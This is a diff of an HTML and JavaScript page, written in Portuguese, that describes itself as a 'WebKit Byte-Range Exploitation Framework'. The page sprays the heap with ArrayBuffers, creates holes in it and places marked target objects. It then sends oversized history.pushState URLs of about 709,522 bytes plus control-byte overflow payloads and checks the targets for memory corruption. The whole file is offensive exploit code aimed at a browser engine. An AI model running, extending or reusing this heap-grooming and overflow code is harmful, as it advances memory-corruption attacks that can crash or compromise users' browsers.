@@ -1,209 +1,314 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>WebKit History.pushState – Metodologia 6-3-1 + Scanner</title>
-  <style>
-    body { font-family: monospace; background: #111; color: #ddd; }
-    button { margin: 6px 0; }
-    #log { max-height: 60vh; overflow-y: auto; border: 1px solid #333; padding: 8px; }
-    .ok { color: #7CFC00; }
-    .warn { color: #FFD700; }
-    .bad { color: #FF6347; }
-  </style>
+    <meta charset="UTF-8">
+    <title>Teste 6-3-1</title>
 </head>
 <body>
 
-<h2>WebKit History.pushState – Metodologia 6-3-1 + Scanner (Teste 9)</h2>
+<h1>Teste 6-3-1</h1>
 
-<button onclick="runAll()">Executar Fluxo Completo (6-3-1 → T1 → T9)</button>
+<h2>DESCOBERTA CRÍTICA</h2>
+<p><strong>Posição 709523+:</strong> Aceita apenas bytes 0x00 a 0x20</p>
+<p><strong>Bytes acima de 0x20:</strong> Causam crash imediato</p>
+
+<hr>
+
+<h2>Teste 1: Mapear Bytes Permitidos</h2>
+<p>Testa cada byte de 0x00 a 0xFF para confirmar quais passam</p>
+<button onclick="test1_MapBytes()">Executar Teste 1</button>
+
+
+
+<h2>Teste 3: Sequências Específicas</h2>
+<p>Testa sequências de bytes de controle com significado especial</p>
+<button onclick="test3_SpecialSequences()">Executar Teste 3</button>
+
+
+
+<h2>Teste 6: Exploração Incremental</h2>
+<p>Aumenta gradualmente tamanho usando apenas bytes válidos</p>
+<label>Start:</label>
+<input type="number" id="t6start" value="1000" min="100" max="50000">
+<label>Step:</label>
+<input type="number" id="t6step" value="5000" min="100" max="10000">
+<button onclick="test6_Incremental()">Executar Teste 6</button>
+
+
+
 <button onclick="clearLog()">Limpar Log</button>
+
+<hr>
 
 <div id="log"></div>
 
 <script>
-// ================================================================
-// CONSTANTES DO ACHADO
-// ================================================================
+// ===================================================================
+// CONSTANTES BASEADAS NA DESCOBERTA
+// ===================================================================
 const BASE_SAFE = 709522;
 const OVERFLOW_START = 709523;
-const MIN_ALLOWED = 0x00;
-const MAX_ALLOWED = 0x20;
+const MIN_ALLOWED_BYTE = 0x00;
+const MAX_ALLOWED_BYTE = 0x20;
 
-// ================================================================
-// LOG
-// ================================================================
-function log(msg, cls="") {
-  const el = document.getElementById('log');
-  const t = new Date().toLocaleTimeString();
-  const d = document.createElement('div');
-  if (cls) d.className = cls;
-  d.textContent = `[${t}] ${msg}`;
-  el.appendChild(d);
-  el.scrollTop = el.scrollHeight;
+// Objetos de controle
+let heapObjects = [];
+let targetObjects = [];
+
+// ===================================================================
+// LOGGING
+// ===================================================================
+function log(msg) {
+    const el = document.getElementById('log');
+    const time = new Date().toLocaleTimeString();
+    el.innerHTML += `<div>[${time}] ${msg}</div>`;
+    el.scrollTop = el.scrollHeight;
 }
-function clearLog() { document.getElementById('log').innerHTML = ""; }
 
-// ================================================================
-// HEAP / ALVOS
-// ================================================================
-let spray = [];
-let targets = [];
+function clearLog() {
+    document.getElementById('log').innerHTML = '';
+    log('Log limpo');
+}
 
+// ===================================================================
+// PREPARAÇÃO DE HEAP
+// ===================================================================
 function prepareHeap() {
-  spray = [];
-  targets = [];
-
-  // Spray principal
-  for (let i = 0; i < 800; i++) {
-    const b = new ArrayBuffer(1024);
-    new Uint32Array(b).fill(0x41414141);
-    spray.push(b);
-  }
-
-  // Criar buracos
-  for (let i = 0; i < spray.length; i += 4) spray[i] = null;
-
-  // Alvos monitorados
-  for (let i = 0; i < 40; i++) {
-    const buf = new ArrayBuffer(1024);
-    const view = new Uint32Array(buf);
-    view.fill(0xDEADBEEF);
-    targets.push({
-      id: i,
-      magic: 0xCAFEBABE,
-      buf,
-      view
-    });
-  }
-
-  log("Heap preparado: spray + alvos", "ok");
+    log('Preparando heap...');
+    
+    heapObjects = [];
+    targetObjects = [];
+    
+    // Spray
+    for (let i = 0; i < 500; i++) {
+        const buf = new ArrayBuffer(1024);
+        const view = new Uint32Array(buf);
+        view.fill(0x41414141);
+        heapObjects.push({buf, view});
+    }
+    
+    // Holes
+    for (let i = 0; i < heapObjects.length; i += 3) {
+        heapObjects[i] = null;
+    }
+    
+    // Alvos
+    for (let i = 0; i < 50; i++) {
+        const buf = new ArrayBuffer(1024);
+        const view = new Uint32Array(buf);
+        view.fill(0xDEADBEEF);
+        targetObjects.push({
+            id: i,
+            magic: 0xCAFEBABE,
+            buf: buf,
+            view: view
+        });
+    }
+    
+    log('Heap preparado: 500 spray + 50 alvos');
 }
 
-// ================================================================
-// TESTE 6 – CRESCIMENTO CONTROLADO (BYTES VÁLIDOS)
-// ================================================================
-function test6_incremental() {
-  log("TESTE 6: crescimento incremental (bytes 0x00–0x20)");
-  const base = "A".repeat(BASE_SAFE);
-
-  let payload = "";
-  for (let i = 0; i < 12000; i++) {
-    payload += String.fromCharCode(i % (MAX_ALLOWED + 1));
-  }
-
-  history.pushState({}, "t6", "/" + base + payload);
-  log("Teste 6 aplicado", "ok");
+function checkCorruption() {
+    let corrupted = 0;
+    for (let i = 0; i < Math.min(10, targetObjects.length); i++) {
+        try {
+            const t = targetObjects[i];
+            if (t.magic !== 0xCAFEBABE) {
+                log(`CORRUPTED alvo ${i}: magic=0x${t.magic.toString(16)}`);
+                corrupted++;
+            }
+            if (t.view[0] !== 0xDEADBEEF) {
+                log(`CORRUPTED alvo ${i}: buffer=0x${t.view[0].toString(16)}`);
+                corrupted++;
+            }
+        } catch (e) {
+            log(`DESTROYED alvo ${i}`);
+            corrupted++;
+        }
+    }
+    return corrupted;
 }
 
-// ================================================================
-// TESTE 3 – SEQUÊNCIAS DE CONTROLE
-// ================================================================
-function test3_sequences() {
-  log("TESTE 3: sequências de controle");
-  const base = "A".repeat(BASE_SAFE);
-  let seq = "";
-
-  const bytes = [0x00, 0x09, 0x0A, 0x0D, 0x20];
-  for (let i = 0; i < 2000; i++) {
-    for (let b of bytes) seq += String.fromCharCode(b);
-  }
-
-  history.pushState({}, "t3", "/" + base + seq);
-  log("Teste 3 aplicado", "ok");
+// ===================================================================
+// TESTE 1: MAPEAR BYTES PERMITIDOS
+// ===================================================================
+function test1_MapBytes() {
+    log('================================');
+    log('TESTE 1: MAPEAMENTO DE BYTES');
+    log('================================');
+    
+    prepareHeap();
+    
+    log('Testando cada byte de 0x00 a 0xFF...');
+    
+    const allowedBytes = [];
+    const crashBytes = [];
+    
+    for (let byte = 0x00; byte <= 0xFF; byte++) {
+        try {
+            const base = "A".repeat(BASE_SAFE);
+            const testByte = String.fromCharCode(byte);
+            const overflow = testByte.repeat(100);
+            const payload = "/" + base + overflow;
+            
+            history.pushState({}, `test_${byte}`, payload);
+            
+            allowedBytes.push(byte);
+            
+            if (byte % 16 === 0) {
+                log(`Testando 0x${byte.toString(16).padStart(2, '0')}... OK`);
+            }
+            
+        } catch (e) {
+            crashBytes.push(byte);
+            log(`CRASH em 0x${byte.toString(16).padStart(2, '0')}: ${e.message}`);
+        }
+    }
+    
+    log('');
+    log('=== RESULTADO ===');
+    log(`Bytes permitidos: ${allowedBytes.length}`);
+    log(`Range: 0x${Math.min(...allowedBytes).toString(16)} - 0x${Math.max(...allowedBytes).toString(16)}`);
+    log(`Lista: [${allowedBytes.map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ')}]`);
+    log('');
+    log(`Bytes que crasham: ${crashBytes.length}`);
+    if (crashBytes.length < 50) {
+        log(`Lista: [${crashBytes.map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ')}]`);
+    }
 }
 
-// ================================================================
-// TESTE 1 – PAYLOAD CRÍTICO (DISPARO)
-// ================================================================
-function test1_critical() {
-  log("TESTE 1: payload crítico (709523+)");
-  const base = "A".repeat(BASE_SAFE);
-
-  let overflow = "";
-  for (let i = 0; i < 64; i++) {
-    overflow += String.fromCharCode(i % (MAX_ALLOWED + 1));
-  }
-
-  history.pushState({}, "t1", "/" + base + overflow);
-  log("Teste 1 executado – estado crítico atingido", "warn");
+// ===================================================================
+// TESTE 3: SEQUÊNCIAS ESPECIAIS
+// ===================================================================
+function test3_SpecialSequences() {
+    log('================================');
+    log('TESTE 3: SEQUÊNCIAS ESPECIAIS');
+    log('================================');
+    
+    prepareHeap();
+    
+    // Sequências com significado especial
+    const sequences = [
+        { name: "Null-terminated", bytes: [0x00, 0x00, 0x00, 0x00] },
+        { name: "Newlines", bytes: [0x0A, 0x0A, 0x0A, 0x0A] },
+        { name: "Tabs", bytes: [0x09, 0x09, 0x09, 0x09] },
+        { name: "Carriage Return", bytes: [0x0D, 0x0D, 0x0D, 0x0D] },
+        { name: "Space", bytes: [0x20, 0x20, 0x20, 0x20] },
+        { name: "Mixed Control", bytes: [0x00, 0x09, 0x0A, 0x0D, 0x20] },
+        { name: "ASCII Control", bytes: [0x01, 0x02, 0x03, 0x04, 0x05] },
+        { name: "Bell/Backspace", bytes: [0x07, 0x08, 0x08, 0x07] }
+    ];
+    
+    for (let seq of sequences) {
+        log('');
+        log(`Testando: ${seq.name}`);
+        log(`Bytes: [${seq.bytes.map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ')}]`);
+        
+        try {
+            const base = "A".repeat(BASE_SAFE);
+            
+            // Repetir sequência 1000 vezes
+            let overflow = "";
+            for (let i = 0; i < 1000; i++) {
+                for (let byte of seq.bytes) {
+                    overflow += String.fromCharCode(byte);
+                }
+            }
+            
+            const payload = "/" + base + overflow;
+            
+            history.pushState({}, seq.name.replace(/\s/g, '_'), payload);
+            
+            log(`SUCESSO: ${seq.name} executado`);
+            
+        } catch (e) {
+            log(`CRASH: ${seq.name} - ${e.message}`);
+        }
+    }
+    
+    setTimeout(() => {
+        log('');
+        log('Verificando corrupção...');
+        const corrupted = checkCorruption();
+        if (corrupted > 0) {
+            log(`RESULTADO: ${corrupted} alvos corrompidos por sequências especiais`);
+        }
+    }, 2000);
 }
 
-// ================================================================
-// TESTE 9 – SCANNER SINCRONIZADO
-// ================================================================
-function snapshotTargets() {
-  return targets.map(t => ({
-    id: t.id,
-    magic: t.magic,
-    first: t.view[0],
-    second: t.view[1]
-  }));
+
+        
+        
+
+// ===================================================================
+// TESTE 6: EXPLORAÇÃO INCREMENTAL
+// ===================================================================
+async function test6_Incremental() {
+    log('================================');
+    log('TESTE 6: EXPLORAÇÃO INCREMENTAL');
+    log('================================');
+    
+    prepareHeap();
+    
+    const start = parseInt(document.getElementById('t6start').value);
+    const step = parseInt(document.getElementById('t6step').value);
+    
+    log(`Começando em ${start} bytes, incremento de ${step}`);
+    
+    let currentSize = start;
+    let maxSuccess = 0;
+    
+    for (let i = 0; i < 10; i++) {
+        log('');
+        log(`Tentativa ${i+1}: ${currentSize} bytes`);
+        
+        try {
+            const base = "A".repeat(BASE_SAFE);
+            
+            // Overflow usando apenas bytes válidos
+            let overflow = "";
+            for (let j = 0; j < currentSize; j++) {
+                overflow += String.fromCharCode(j % 33);
+            }
+            
+            const payload = "/" + base + overflow;
+            
+            history.pushState({}, `inc_${currentSize}`, payload);
+            
+            log(`SUCESSO com ${currentSize} bytes`);
+            maxSuccess = currentSize;
+            
+            currentSize += step;
+            
+            await new Promise(r => setTimeout(r, 1500));
+            
+        } catch (e) {
+            log(`CRASH em ${currentSize} bytes: ${e.message}`);
+            break;
+        }
+    }
+    
+    log('');
+    log('=== RESULTADO ===');
+    log(`Tamanho máximo sem crash: ${maxSuccess} bytes`);
+    
+    setTimeout(() => {
+        const corrupted = checkCorruption();
+        if (corrupted > 0) {
+            log(`EXPLORAÇÃO SUCESSO! ${corrupted} alvos corrompidos`);
+        }
+    }, 1000);
 }
 
-function perturbHeapLight() {
-  // perturbação mínima para expor race/cleanup
-  const tmp = [];
-  for (let i = 0; i < 50; i++) tmp.push(new ArrayBuffer(256));
-}
+        
 
-function scanDiff(a, b) {
-  let diffs = 0;
-  for (let i = 0; i < a.length; i++) {
-    if (a[i].magic !== b[i].magic ||
-        a[i].first !== b[i].first ||
-        a[i].second !== b[i].second) {
-      log(
-        `CORRUPÇÃO alvo ${i}: ` +
-        `magic ${a[i].magic.toString(16)}→${b[i].magic.toString(16)} | ` +
-        `v0 ${a[i].first.toString(16)}→${b[i].first.toString(16)}`,
-        "bad"
-      );
-      diffs++;
-    }
-  }
-  return diffs;
-}
-
-function test9_scanner() {
-  log("TESTE 9: scanner pós-condição (sincronizado)");
-
-  const snap1 = snapshotTargets();
-  perturbHeapLight();
-  const snap2 = snapshotTargets();
-
-  const changes = scanDiff(snap1, snap2);
-
-  if (changes === 0) {
-    log("Nenhuma alteração detectada (estado estável)", "ok");
-  } else {
-    log(`MEMÓRIA ALTERADA: ${changes} alvos`, "bad");
-  }
-}
-
-// ================================================================
-// FLUXO COMPLETO 6-3-1 → SCANNER
-// ================================================================
-function runAll() {
-  log("======================================");
-  log("INICIANDO METODOLOGIA 6-3-1 + TESTE 9");
-  log("======================================");
-
-  prepareHeap();
-
-  // 6
-  test6_incremental();
-  // 3
-  test3_sequences();
-  // 1 (disparo)
-  test1_critical();
-  // 9 (scanner imediato)
-  test9_scanner();
-
-  log("Fluxo concluído");
-}
+// ===================================================================
+// INICIALIZAÇÃO
+// ===================================================================
+log('WebKit Byte-Range Exploitation Framework');
+log('Bytes permitidos: 0x00 - 0x20');
+log('Base segura: 709522 bytes');
+log('Comece com Teste 1 para confirmar bytes permitidos');
 </script>
 
 </body>
 </html>
-
